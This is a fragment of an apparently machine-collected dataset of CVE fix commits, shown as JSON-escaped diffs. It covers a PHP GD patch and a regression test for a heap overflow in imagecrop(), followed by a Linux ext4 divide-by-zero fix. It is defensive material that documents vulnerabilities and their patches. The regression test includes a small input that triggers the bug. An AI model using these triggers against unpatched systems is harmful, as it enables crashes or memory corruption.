\t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"You must have a 3x3 matrix\");\n \t\t\t\t\tRETURN_FALSE;\n@@ -4954,28 +4978,60 @@ PHP_FUNCTION(imagecrop)\n \tZEND_FETCH_RESOURCE(im, gdImagePtr, &IM, -1, \"Image\", le_gd);\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"x\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\trect.x = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.x = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.x = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing x position\");\n \t\tRETURN_FALSE;\n \t}\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"y\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\trect.y = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.y = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.y = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing y position\");\n \t\tRETURN_FALSE;\n \t}\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"width\", sizeof(\"width\"), (void **)&tmp) != FAILURE) {\n-\t\trect.width = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.width = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.width = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing width\");\n \t\tRETURN_FALSE;\n \t}\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"height\", sizeof(\"height\"), (void **)&tmp) != FAILURE) {\n-\t\trect.height = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.height = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.height = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing height\");\n \t\tRETURN_FALSE;\n@@ -5124,8 +5180,13 @@ PHP_FUNCTION(imageaffine)\n \t\t\t\t\taffine[i] = Z_DVAL_PP(zval_affine_elem);\n \t\t\t\t\tbreak;\n \t\t\t\tcase IS_STRING:\n-\t\t\t\t\tconvert_to_double_ex(zval_affine_elem);\n-\t\t\t\t\taffine[i] = Z_DVAL_PP(zval_affine_elem);\n+\t\t\t\t\t{\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **zval_affine_elem;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\taffine[i] = Z_DVAL(dval);\n+\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tdefault:\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Invalid type for element %i\", i);\n@@ -5136,32 +5197,60 @@ PHP_FUNCTION(imageaffine)\n \n \tif (z_rect != NULL) {\n \t\tif (zend_hash_find(HASH_OF(z_rect), \"x\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.x = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.x = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.x = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing x position\");\n \t\t\tRETURN_FALSE;\n \t\t}\n \n \t\tif (zend_hash_find(HASH_OF(z_rect), \"y\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.y = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.y = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.y = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing y position\");\n \t\t\tRETURN_FALSE;\n \t\t}\n \n \t\tif (zend_hash_find(HASH_OF(z_rect), \"width\", sizeof(\"width\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.width = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.width = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.width = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing width\");\n \t\t\tRETURN_FALSE;\n \t\t}\n \n \t\tif (zend_hash_find(HASH_OF(z_rect), \"height\", sizeof(\"height\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.height = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.height = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.height = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing height\");\n \t\t\tRETURN_FALSE;\n@@ -5211,16 +5300,30 @@ PHP_FUNCTION(imageaffinematrixget)\n \t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Array expected as options\");\n \t\t\t}\n \t\t\tif (zend_hash_find(HASH_OF(options), \"x\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\tx = Z_DVAL_PP(tmp);\n+\t\t\t\tif (Z_TYPE_PP(tmp) != IS_DOUBLE) {\n+\t\t\t\t\tzval dval;\n+\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\tx = Z_DVAL(dval);\n+\t\t\t\t} else {\n+\t\t\t\t\tx = Z_DVAL_PP(tmp);\n+\t\t\t\t}\n \t\t\t} else {\n \t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing x position\");\n \t\t\t\tRETURN_FALSE;\n \t\t\t}\n \n \t\t\tif (zend_hash_find(HASH_OF(options), \"y\", sizeof(\"y\"), (void **)&tmp) != FAILURE) {\n-\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\ty = Z_DVAL_PP(tmp);\n+\t\t\t\tif (Z_TYPE_PP(tmp) != IS_DOUBLE) {\n+\t\t\t\t\tzval dval;\n+\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\ty = Z_DVAL(dval);\n+\t\t\t\t} else {\n+\t\t\t\t\ty = Z_DVAL_PP(tmp);\n+\t\t\t\t}\n \t\t\t} else {\n \t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing y position\");\n \t\t\t\tRETURN_FALSE;\n@@ -5300,8 +5403,13 @@ PHP_FUNCTION(imageaffinematrixconcat)\n \t\t\t\t\tm1[i] = Z_DVAL_PP(tmp);\n \t\t\t\t\tbreak;\n \t\t\t\tcase IS_STRING:\n-\t\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\t\tm1[i] = Z_DVAL_PP(tmp);\n+\t\t\t\t\t{\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\tm1[i] = Z_DVAL(dval);\n+\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tdefault:\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Invalid type for element %i\", i);\n@@ -5317,8 +5425,13 @@ PHP_FUNCTION(imageaffinematrixconcat)\n \t\t\t\t\tm2[i] = Z_DVAL_PP(tmp);\n \t\t\t\t\tbreak;\n \t\t\t\tcase IS_STRING:\n-\t\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\t\tm2[i] = Z_DVAL_PP(tmp);\n+\t\t\t\t\t{\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\tm2[i] = Z_DVAL(dval);\n+\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tdefault:\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Invalid type for element %i\", i);\ndiff --git a\/ext\/gd\/tests\/bug66356.phpt b\/ext\/gd\/tests\/bug66356.phpt\nnew file mode 100644\nindex 000000000000..f88149471640\n--- \/dev\/null\n+++ b\/ext\/gd\/tests\/bug66356.phpt\n@@ -0,0 +1,22 @@\n+--TEST--\n+Bug #66356 (Heap Overflow Vulnerability in imagecrop())\n+--SKIPIF--\n+<?php\n+\tif(!extension_loaded('gd')){ die('skip gd extension not available'); }\n+?>\n+--FILE--\n+<?php\n+$img = imagecreatetruecolor(10, 10);\n+$img = imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10));\n+$arr = array(\"x\" => \"a\", \"y\" => \"12b\", \"width\" => 10, \"height\" => 10);\n+$img = imagecrop($img, $arr);\n+print_r($arr);\n+?>\n+--EXPECTF--\n+Array\n+(\n+    [x] => a\n+    [y] => 12b\n+    [width] => 10\n+    [height] => 10\n+)\ndiff --git a\/main\/php_version.h b\/main\/php_version.h\nindex 8d30a367d368..d9ea4aab3cd6 100644\n--- a\/main\/php_version.h\n+++ b\/main\/php_version.h\n@@ -2,7 +2,7 @@\n \/* edit configure.in to change version number *\/\n #define PHP_MAJOR_VERSION 5\n #define PHP_MINOR_VERSION 5\n-#define PHP_RELEASE_VERSION 8\n+#define PHP_RELEASE_VERSION 5\n #define PHP_EXTRA_VERSION \"-dev\"\n-#define PHP_VERSION \"5.5.8-dev\"\n-#define PHP_VERSION_ID 50508\n+#define PHP_VERSION \"5.5.5-dev\"\n+#define PHP_VERSION_ID 50505\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2009-4307","CWE_ID":"189","category":"security","commit_id":"503358ae01b70ce6909d19dd01287093f6b6271c","commit_message":"From 503358ae01b70ce6909d19dd01287093f6b6271c Mon Sep 17 00:00:00 2001\nFrom: Theodore Ts'o <tytso@mit.edu>\nDate: Mon, 23 Nov 2009 07:24:46 -0500\nSubject: ext4: avoid divide by zero when trying to mount a corrupted file\n system\n\nIf s_log_groups_per_flex is greater than 31, then groups_per_flex will\nwill overflow and cause a divide by zero error.  This can cause kernel\nBUG if such a file system is mounted.\n\nThanks to Nageswara R Sastry for analyzing the failure and providing\nan initial patch.\n\nhttp:\/\/bugzilla.kernel.org\/show_bug.cgi?id=14287\n\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@kernel.org\n---\n fs\/ext4\/super.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ext4\/super.c b\/fs\/ext4\/super.c\nindex d4ca92aab514..8662b2e6e9f9 100644\n--- a\/fs\/ext4\/super.c\n+++ b\/fs\/ext4\/super.c\n@@ -1673,14 +1673,14 @@ static int ext4_fill_flex_info(struct super_block *sb)\n \tsize_t size;\n \tint i;\n \n-\tif (!sbi->s_es->s_log_groups_per_flex) {\n+\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n+\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n+\n+\tif (groups_per_flex < 2) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n \n-\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n-\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n-\n \t\/* We allocate both existing and potentially added groups *\/\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n \t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"}]